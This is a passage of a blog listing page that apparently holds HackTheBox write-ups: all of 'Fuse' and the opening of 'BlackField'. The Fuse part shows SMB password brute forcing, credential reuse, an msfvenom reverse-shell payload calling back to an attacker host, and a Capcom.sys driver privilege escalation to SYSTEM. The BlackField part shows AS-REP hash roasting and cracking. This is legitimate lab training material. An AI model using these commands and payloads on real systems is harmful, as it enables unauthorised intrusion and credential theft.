+				<a class="link" href="/categories/hackthebox-challenge/misc/">misc</a>           
+		
+      
+	</div>
+	
+
+	<div class="article-tags">
+		
+			<i class="iconfont icon-tags" style="margin-right:4px"></i>
+			            
+				<a class="link" href="/tags/hackthebox/">hackthebox</a>           
+			
+		
+	</div>
+
+	<div class='article-bottom'>
+		<a class="readmore" href="/2020/08/15/Challenge-G0ld/">Continue</a> 	
+	</div>	
+    
+</article>
+
+	
+	
+	
+	
+
+<article class="article">		
+	   
+	<div class="article-header">
+	    
+		<a  class="title" href="/2020/06/15/HTB-Fuse/">HTB Fuse Writeup</a>  
+	       
+		 
+
+		<div class='meta'>
+			<time>Jun 15, 2020</time>			
+		</div>
+	</div>
+
+
+	
+
+    
+	<div class="typo article-excerpt">	
+		 
+			<p><img src="/images/HTB-Fuse-Medium/image-20200907105043113.png" alt="image-20200907105043113"></p>
+<h2 id="Author-Ikonw"><a href="#Author-Ikonw" class="headerlink" title="Author Ikonw"></a>Author Ikonw</h2><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.80 scan initiated Wed Sep  2 03:57:19 2020 as: nmap -Pn -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49666,49667,49675,49676,49680,49698 -oN nmap/Full_10.10.10.193.nmap 10.10.10.193</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.193</span><br><span class="line">Host is up (0.0079s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">53/tcp    open  domain?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   DNSVersionBindReqTCP: </span><br><span class="line">|     version</span><br><span class="line">|_    <span class="built_in">bind</span></span><br><span class="line">80/tcp    open  http         Microsoft IIS httpd 10.0</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (text/html).</span></span><br><span class="line"><span class="string">88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-09-02 08:10:26Z)</span></span><br><span class="line"><span class="string">135/tcp   open  msrpc        Microsoft Windows RPC</span></span><br><span class="line"><span class="string">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span></span><br><span class="line"><span class="string">389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)</span></span><br><span class="line"><span class="string">445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: FABRICORP)</span></span><br><span class="line"><span class="string">464/tcp   open  kpasswd5?</span></span><br><span class="line"><span class="string">593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span></span><br><span class="line"><span class="string">636/tcp   open  tcpwrapped</span></span><br><span class="line"><span class="string">3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)</span></span><br><span class="line"><span class="string">3269/tcp  open  tcpwrapped</span></span><br><span class="line"><span class="string">5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span></span><br><span class="line"><span class="string">|_http-server-header: Microsoft-HTTPAPI/2.0</span></span><br><span class="line"><span class="string">|_http-title: Not Found</span></span><br><span class="line"><span class="string">9389/tcp  open  mc-nmf       .NET Message Framing</span></span><br><span class="line"><span class="string">49666/tcp open  msrpc        Microsoft Windows RPC</span></span><br><span class="line"><span class="string">49667/tcp open  msrpc        Microsoft Windows RPC</span></span><br><span class="line"><span class="string">49675/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span></span><br><span class="line"><span class="string">49676/tcp open  msrpc        Microsoft Windows RPC</span></span><br><span class="line"><span class="string">49680/tcp open  msrpc        Microsoft Windows RPC</span></span><br><span class="line"><span class="string">49698/tcp open  msrpc        Microsoft Windows RPC</span></span><br><span class="line"><span class="string">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span></span><br><span class="line"><span class="string">SF-Port53-TCP:V=7.80%I=7%D=9/2%Time=5F4F506B%P=x86_64-pc-linux-gnu%r(DNSVe</span></span><br><span class="line"><span class="string">SF:rsionBindReqTCP,20,&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x</span></span><br><span class="line"><span class="string">SF:04bind\0\0\x10\0\x03&quot;);</span></span><br><span class="line"><span class="string">Service Info: Host: FUSE; OS: Windows; CPE: cpe:/o:microsoft:windows</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Host script results:</span></span><br><span class="line"><span class="string">|_clock-skew: mean: 2h33m00s, deviation: 4h02m32s, median: 12m58s</span></span><br><span class="line"><span class="string">| smb-os-discovery: </span></span><br><span class="line"><span class="string">|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)</span></span><br><span class="line"><span class="string">|   Computer name: Fuse</span></span><br><span class="line"><span class="string">|   NetBIOS computer name: FUSE\x00</span></span><br><span class="line"><span class="string">|   Domain name: fabricorp.local</span></span><br><span class="line"><span class="string">|   Forest name: fabricorp.local</span></span><br><span class="line"><span class="string">|   FQDN: Fuse.fabricorp.local</span></span><br><span class="line"><span class="string">|_  System time: 2020-09-02T01:12:45-07:00</span></span><br><span class="line"><span class="string">| smb-security-mode: </span></span><br><span class="line"><span class="string">|   account_used: guest</span></span><br><span class="line"><span class="string">|   authentication_level: user</span></span><br><span class="line"><span class="string">|   challenge_response: supported</span></span><br><span class="line"><span class="string">|_  message_signing: required</span></span><br><span class="line"><span class="string">| smb2-security-mode: </span></span><br><span class="line"><span class="string">|   2.02: </span></span><br><span class="line"><span class="string">|_    Message signing enabled and required</span></span><br><span class="line"><span class="string">| smb2-time: </span></span><br><span class="line"><span class="string">|   date: 2020-09-02T08:12:42</span></span><br><span class="line"><span class="string">|_  start_date: 2020-09-02T08:04:25</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string"># Nmap done at Wed Sep  2 04:01:52 2020 -- 1 IP address (1 host up) scanned in 273.40 seconds</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+<p>We get the FQDN from the smb-os-discovery script</p>
+<p>add it to the <strong>&#x2F;etc&#x2F;hosts</strong></p>
+<p>I like to enumerate smb ports first</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># enum4linux Fuse.fabricorp.local</span></span><br><span class="line">Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Sep  7 11:02:19 2020</span><br></pre></td></tr></table></figure>
+
+<p>However it didnt give me any critical information, anonymous login didnt get me anything too</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># smbclient -L 10.10.10.193                                                       </span></span><br><span class="line">Enter WORKGROUP\root<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Anonymous login successful</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Sharename       Type      Comment</span></span><br><span class="line"><span class="string">        ---------       ----      -------</span></span><br><span class="line"><span class="string">SMB1 disabled -- no workgroup available</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+<p>Start investigate the web, it’s a papercut CMS if im not wrong. </p>
+<p>Found some user in each print logs</p>
+<p><img src="/images/HTB-Fuse-Medium/image-20200907111546993.png" alt="image-20200907111546993"></p>
+<p>We collect all the user</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pmerton</span><br><span class="line">tlavel</span><br><span class="line">sthompson</span><br><span class="line">bhult</span><br><span class="line">administrator</span><br></pre></td></tr></table></figure>
+
+<p>According to previous box such as <strong>sauna</strong>.</p>
+<p>The entry point most likely is to collect user and password from the web server and brute force on smb ports.</p>
+<p>Therefore we use <strong>cewl</strong> to make a collection of password dictionary.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cewl -w wordlist http://fuse.fabricorp.local/papercut/logs/html/index.htm -m3 --with-numbers</span><br></pre></td></tr></table></figure>
+
+<p>Launch msfconsole use the <strong>smb_login</strong> module to bruteforce </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 auxiliary(scanner/smb/smb_login) &gt; <span class="built_in">set</span> USER_FILE user</span><br><span class="line">USER_FILE =&gt; user</span><br><span class="line">msf5 auxiliary(scanner/smb/smb_login) &gt; <span class="built_in">set</span> PASS_FILE wordlist</span><br><span class="line">PASS_FILE =&gt; wordlist</span><br><span class="line">msf5 auxiliary(scanner/smb/smb_login) &gt; <span class="built_in">set</span> rhosts 10.10.10.193</span><br><span class="line">rhosts =&gt; 10.10.10.193</span><br><span class="line">msf5 auxiliary(scanner/smb/smb_login) &gt; <span class="built_in">set</span> smbdomain fabricorp.local</span><br><span class="line">smbdomain =&gt; fabricorp.local</span><br><span class="line">msf5 auxiliary(scanner/smb/smb_login) &gt; run</span><br></pre></td></tr></table></figure>
+
+<p>successfully got 2 creds</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[+] 10.10.10.193:445      - 10.10.10.193:445 - Success: <span class="string">&#x27;fabricorp.local\tlavel:Fabricorp01&#x27;</span></span><br><span class="line">[+] 10.10.10.193:445      - 10.10.10.193:445 - Success: <span class="string">&#x27;fabricorp.local\bhult:Fabricorp01&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>Trying login to smb server, but was prompt with error which I never meet. Both account have the same problem</p>
+<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~/Desktop/hackthebox/Windows/fuse]</span><br><span class="line">└─<span class="meta"># smbclient -L 10.10.10.193 -U tlavel           </span></span><br><span class="line">Enter WORKGROUP\tlavel<span class="number">&#x27;</span>s password: </span><br><span class="line">session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE</span><br><span class="line">                                                                                                                   </span><br><span class="line">┌──(root💀kali)-[~/Desktop/hackthebox/Windows/fuse]</span><br><span class="line">└─<span class="meta"># smbclient -L 10.10.10.193 -U bhult                                                                         </span></span><br><span class="line">Enter WORKGROUP\bhult<span class="number">&#x27;</span>s password: </span><br><span class="line">session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE</span><br></pre></td></tr></table></figure>
+
+<p>After some google,find out I can use smbpasswd to change the password</p>
+<p><img src="/images/HTB-Fuse-Medium/image-20200907113508780.png" alt="image-20200907113508780"></p>
+<p>There seems some password policy, so I change the password to <strong>Fabricop011</strong> for both accout</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~/Desktop/hackthebox/Windows/fuse]</span><br><span class="line">└─<span class="comment"># smbpasswd -r 10.10.10.193 -U tlavel                                                                        </span></span><br><span class="line">Old SMB password:</span><br><span class="line">New SMB password:</span><br><span class="line">Retype new SMB password:</span><br><span class="line">Password changed <span class="keyword">for</span> user tlavel on 10.10.10.193.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>After some enumeration on <strong>rpcclient</strong> and password <strong>$fab@s3Rv1ce$1</strong></p>
+<p>found some username </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpcclient $&gt; enumdomusers</span><br><span class="line">user:[Administrator] rid:[0x1f4]</span><br><span class="line">user:[Guest] rid:[0x1f5]</span><br><span class="line">user:[krbtgt] rid:[0x1f6]</span><br><span class="line">user:[DefaultAccount] rid:[0x1f7]</span><br><span class="line">user:[svc-print] rid:[0x450]</span><br><span class="line">user:[bnielson] rid:[0x451]</span><br><span class="line">user:[sthompson] rid:[0x641]</span><br><span class="line">user:[tlavel] rid:[0x642]</span><br><span class="line">user:[pmerton] rid:[0x643]</span><br><span class="line">user:[svc-scan] rid:[0x645]</span><br><span class="line">user:[bhult] rid:[0x1bbd]</span><br><span class="line">user:[dandrews] rid:[0x1bbe]</span><br><span class="line">user:[mberbatov] rid:[0x1db1]</span><br><span class="line">user:[astein] rid:[0x1db2]</span><br><span class="line">user:[dmuir] rid:[0x1db3]</span><br></pre></td></tr></table></figure>
+
+<p>and one password</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpcclient $&gt; enumprinters</span><br><span class="line">        flags:[0x800000]</span><br><span class="line">        name:[\\10.10.10.193\HP-MFT01]</span><br><span class="line">        description:[\\10.10.10.193\HP-MFT01,HP Universal Printing PCL 6,Central (Near IT, scan2docs password: <span class="variable">$fab</span>@s3Rv1ce<span class="variable">$1</span>)]</span><br><span class="line">        comment:[]</span><br></pre></td></tr></table></figure>
+
+<p>and we try to login to windows using this credentials.</p>
+<p>Went back to to msfconsole, we lanuch <strong>win_rm</strong> module to brute force the username against the password</p>
+<p>and we got the creds <strong>svc-print:$fab@s3Rv1ce$1</strong></p>
+<p>use <strong>evil-winrm</strong> to login</p>
+<figure class="highlight moonscript"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/opt/evil-winrm]</span><br><span class="line">└─# ./evil-winrm.rb -i <span class="number">10.10</span><span class="number">.10</span><span class="number">.193</span> -u svc-<span class="built_in">print</span> -p \$fab@s3Rv1ce\$<span class="number">1</span>                                           <span class="number">1</span> ⨯</span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v2<span class="number">.3</span></span><br><span class="line"></span><br><span class="line"><span class="name">Info</span>: Establishing connection to remote endpoint</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS <span class="name">C</span>:\Users\svc-print\Documents&gt; dir</span><br><span class="line">*Evil-WinRM* PS <span class="name">C</span>:\Users\svc-print\Documents&gt; cd ..</span><br><span class="line">*Evil-WinRM* PS <span class="name">C</span>:\Users\svc-<span class="built_in">print</span>&gt; dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="name">Directory</span>: <span class="name">C</span>:\Users\svc-<span class="built_in">print</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line"><span class="comment">----                -------------         ------ ----</span></span><br><span class="line">d-r<span class="comment">---         6/1/2020   1:45 AM                Desktop</span></span><br><span class="line">d-r<span class="comment">---        5/31/2020   5:20 PM                Documents</span></span><br><span class="line">d-r<span class="comment">---        7/16/2016   6:18 AM                Downloads</span></span><br><span class="line">d-r<span class="comment">---        7/16/2016   6:18 AM                Favorites</span></span><br><span class="line">d-r<span class="comment">---        7/16/2016   6:18 AM                Links</span></span><br><span class="line">d-r<span class="comment">---        7/16/2016   6:18 AM                Music</span></span><br><span class="line">d-r<span class="comment">---        7/16/2016   6:18 AM                Pictures</span></span><br><span class="line">d<span class="comment">-----        7/16/2016   6:18 AM                Saved Games</span></span><br><span class="line">d-r<span class="comment">---        7/16/2016   6:18 AM                Videos</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS <span class="name">C</span>:\Users\svc-<span class="built_in">print</span>&gt; cd Desktop</span><br><span class="line">*Evil-WinRM* PS <span class="name">C</span>:\Users\svc-print\Desktop&gt; dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="name">Directory</span>: <span class="name">C</span>:\Users\svc-print\Desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line"><span class="comment">----                -------------         ------ ----</span></span><br><span class="line">-ar<span class="comment">---         9/7/2020  12:35 AM             34 user.txt</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h2><p>After getting root, check user’s privilege </p>
+<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                    State</span><br><span class="line"><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span> <span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span> <span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line">SeMachineAccountPrivilege     Add workstations to domain     Enabled</span><br><span class="line">SeLoadDriverPrivilege         Load and unload device drivers Enabled</span><br><span class="line">SeShutdownPrivilege           Shut down the system           Enabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set Enabled</span><br></pre></td></tr></table></figure>
+
+<p><strong>seLoadDrivePrivilege</strong> is enabled</p>
+<p><a target="_blank" rel="noopener" href="https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/">Abusing SeLoadDriverPrivilege for privilege escalation</a></p>
+<p>This site is a good reference for SeLoadDriverPrivilege escalation</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/umiterkol/EoPLoadDriver_Release/releases">EopLoaddriver</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/FuzzySecurity/Capcom-Rootkit/raw/master/Driver/Capcom.sys">Capcom.sys</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/tandasat/ExploitCapcom">ExploitCapcom</a></p>
+<p>open up the ExploitCapcom.cpp file, modify the Launch shell function. Change the commandLine[] targeted to a meterpreter.exe and compile it.</p>
+<p><img src="/images/HTB-Fuse-Medium/image-20200907191952261.png" alt="image-20200907191952261"></p>
+<p>Next we have to generate a meterpreter.exe</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.10.10 lport=1234 -f exe &gt; meterpreter.exe</span><br></pre></td></tr></table></figure>
+
+<p>Create a folder called <strong>temp</strong> in C:\</p>
+<p>and upload all the 4 files to the target server.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\temp&gt; .\EOPLOADDRIVER.exe System\CurrentControlSet\MyService C:\temp\capcom.sys</span><br><span class="line">[+] Enabling SeLoadDriverPrivilege</span><br><span class="line">[+] SeLoadDriverPrivilege Enabled</span><br><span class="line">[+] Loading Driver: \Registry\User\S-1-5-21-2633719317-1471316042-3957863514-1104\System\CurrentControlSet\MyService</span><br><span class="line">NTSTATUS: c000010e, WinError: 0</span><br><span class="line">*Evil-WinRM* PS C:\temp&gt; .\ExploitCapcom.exe</span><br><span class="line">[*] Capcom.sys exploit</span><br><span class="line">[*] Capcom.sys handle was obtained as 0000000000000080</span><br><span class="line">[*] Shellcode was placed at 000002841CC20008</span><br><span class="line">[+] Shellcode was executed</span><br><span class="line">[+] Token stealing was successful</span><br><span class="line">[+] The SYSTEM shell was launched</span><br><span class="line">[*] Press any key to <span class="built_in">exit</span> this program</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>And we got the meterpreter session on our multi handler</p>
+<br/>
+<br/>
+<br/>
+
+<p><img src="/images/root.gif" alt="root"></p>
+
+		  	  
+	</div>
+
+
+
+	<div class="article-categories">
+	 
+      <i class="iconfont icon-category" style="margin-right:4px"></i>
+	  	            
+				<a class="link" href="/categories/hackthebox/">hackthebox</a>           
+		
+      
+	</div>
+	
+
+	<div class="article-tags">
+		
+			<i class="iconfont icon-tags" style="margin-right:4px"></i>
+			            
+				<a class="link" href="/tags/hackthebox/">hackthebox</a>           
+			            
+				<a class="link" href="/tags/medium/">medium</a>           
+			
+		
+	</div>
+
+	<div class='article-bottom'>
+		<a class="readmore" href="/2020/06/15/HTB-Fuse/">Continue</a> 	
+	</div>	
+    
+</article>
+
+	
+	
+	
+	
+
+<article class="article">		
+	   
+	<div class="article-header">
+	    
+		<a  class="title" href="/2020/06/10/HTB-BlackField/">HTB BlackField Writeup</a>  
+	       
+		 
+
+		<div class='meta'>
+			<time>Jun 10, 2020</time>			
+		</div>
+	</div>
+
+
+	
+
+    
+	<div class="typo article-excerpt">	
+		 
+			<p><img src="/images/HTB-Blackfield-Hard/image-20200907210058092.png" alt="image-20200907210058092"></p>
+<h2 id="Author-Ikonw"><a href="#Author-Ikonw" class="headerlink" title="Author: Ikonw"></a>Author: Ikonw</h2><h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan:"></a>Nmap Scan:</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-07 20:09 +08</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.192</span><br><span class="line">Host is up (0.0074s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE    SERVICE       VERSION</span><br><span class="line">88/tcp   open     kerberos-sec  Microsoft Windows Kerberos (server time: 2020-09-07 19:09:38Z)</span><br><span class="line">135/tcp  open     msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  filtered netbios-ssn</span><br><span class="line">389/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open     microsoft-ds?</span><br><span class="line">593/tcp  open     ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">3268/tcp open     ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)</span><br><span class="line">5985/tcp open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: 6h59m59s</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2020-09-07T19:09:47</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 51.59 seconds</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Launch smbmap login using anonymous account, found 2 files we can read</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/opt/nmapAutomator]</span><br><span class="line">└─<span class="comment"># smbmap -H 10.10.10.192 -u anonymous                                                                                   2 ⨯</span></span><br><span class="line">[+] Guest session       IP: 10.10.10.192:445    Name: 10.10.10.192                                      </span><br><span class="line">        Disk                                                    Permissions     Comment</span><br><span class="line">        ----                                                    -----------     -------</span><br><span class="line">        ADMIN$                                                  NO ACCESS       Remote Admin</span><br><span class="line">        C$                                                      NO ACCESS       Default share</span><br><span class="line">        forensic                                                NO ACCESS       Forensic / Audit share.</span><br><span class="line">        IPC$                                                    READ ONLY       Remote IPC</span><br><span class="line">        NETLOGON                                                NO ACCESS       Logon server share </span><br><span class="line">        profiles$                                               READ ONLY</span><br><span class="line">        SYSVOL                                                  NO ACCESS       Logon server share </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>Access to <strong>profiles$</strong></p>
+<p>We found tons of user name, use along with awk command we collect the usernames</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient \\\\10.10.10.192\\profiles$ -c <span class="built_in">ls</span> | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> &gt; user.lst</span><br></pre></td></tr></table></figure>
+
+<p>Launch the impacket tool <strong>GetNPUsers.py</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~/Desktop/hackthebox/Windows/blackfield]</span><br><span class="line">└─<span class="comment"># python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py BLACKFIELD.local/ -no-pass -usersfile user.lst | grep -v &quot;not found&quot;</span></span><br><span class="line">Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[-] User audit2020 doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">$krb5asrep$23$support@BLACKFIELD.LOCAL:d3f58a3eb5d36dc74f2c4a4335a5ce3e$06ce4ccf78e620d6e2e9994bd546f519cabec98dd1879365456bcee2081d7f0579d8e6b20d7b0e5750c533de72b48404ad38bf2241acc01cdf9e1868717cb01142ab131ebda7de2a0916a141ba5b1fd1b8e0895833ea57ce4b01cd93900eba7c4bab1e1a8dfcdb471486fedc1f731b5e65f38219e37883274350288d916e18f43359a170dd9aa3ef22d53c399378ed3467467211d6be448ee73983abe6cf7998725bfa70b7de45969715c15417af5249ebe9dd16332222f17101bbb1bdbfc2d32ac2bc319302911973a88a2b67fd425092e0f31329d04fd9eca106a97f2265185f6ae6c8ca8e747272dcad410bfbedac0275ed12</span></span><br><span class="line"><span class="string">[-] User svc_backup doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br><span class="line">[-] invalid principal syntax</span><br></pre></td></tr></table></figure>
+
+<p>Save the hash and use john to crack it.</p>
+<p>We got the creds <strong>support:#00^BlackKnight</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~/Desktop/hackthebox/Windows/blackfield]</span><br><span class="line">└─<span class="comment"># john --wordlist=/usr/share/wordlists/rockyou.txt user_hash</span></span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line"><span class="comment">#00^BlackKnight  ($krb5asrep$23$support@BLACKFIELD.LOCAL)</span></span><br><span class="line">1g 0:00:00:16 DONE (2020-09-07 21:30) 0.06203g/s 889266p/s 889266c/s 889266C/s <span class="comment">#1ByNature..#*burberry#*1990</span></span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Try login using winrm port, but it failed.</p>
+<p>Let’s go back to use new credentials to smb server</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~/Desktop/hackthebox/Windows/blackfield]</span><br><span class="line">└─<span class="comment"># smbmap -H 10.10.10.192 -u support -p &quot;#00^BlackKnight&quot;                                                                2 ⨯</span></span><br><span class="line">[+] IP: 10.10.10.192:445        Name: BLACKFIELD.<span class="built_in">local</span>                                  </span><br><span class="line">        Disk                                                    Permissions     Comment</span><br><span class="line">        ----                                                    -----------     -------</span><br><span class="line">        ADMIN$                                                  NO ACCESS       Remote Admin</span><br><span class="line">        C$                                                      NO ACCESS       Default share</span><br><span class="line">        forensic                                                NO ACCESS       Forensic / Audit share.</span><br><span class="line">        IPC$                                                    READ ONLY       Remote IPC</span><br><span class="line">        NETLOGON                                                READ ONLY       Logon server share </span><br><span class="line">        profiles$                                               READ ONLY</span><br><span class="line">        SYSVOL                                                  READ ONLY       Logon server share </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Found nothing interesting </p>
+<p>use rpcclient connect to rpc</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpcclient -U blackfield.local\\support 10.10.10.192</span><br><span class="line">rpcclient $&gt; enumdomusers</span><br><span class="line">user:[Administrator] rid:[0x1f4]</span><br><span class="line">user:[Guest] rid:[0x1f5]</span><br><span class="line">user:[krbtgt] rid:[0x1f6]</span><br><span class="line">user:[audit2020] rid:[0x44f]</span><br><span class="line">user:[support] rid:[0x450]</span><br><span class="line">user:[BLACKFIELD764430] rid:[0x451]</span><br><span class="line">user:[BLACKFIELD538365] rid:[0x452]</span><br><span class="line">user:[BLACKFIELD189208] rid:[0x453]</span><br><span class="line">user:[BLACKFIELD404458] rid:[0x454]</span><br><span class="line">user:[BLACKFIELD706381] rid:[0x455]</span><br><span class="line">user:[BLACKFIELD937395] rid:[0x456]</span><br><span class="line">...........................</span><br></pre></td></tr></table></figure>
+
+<p>We got tons of user again.</p>
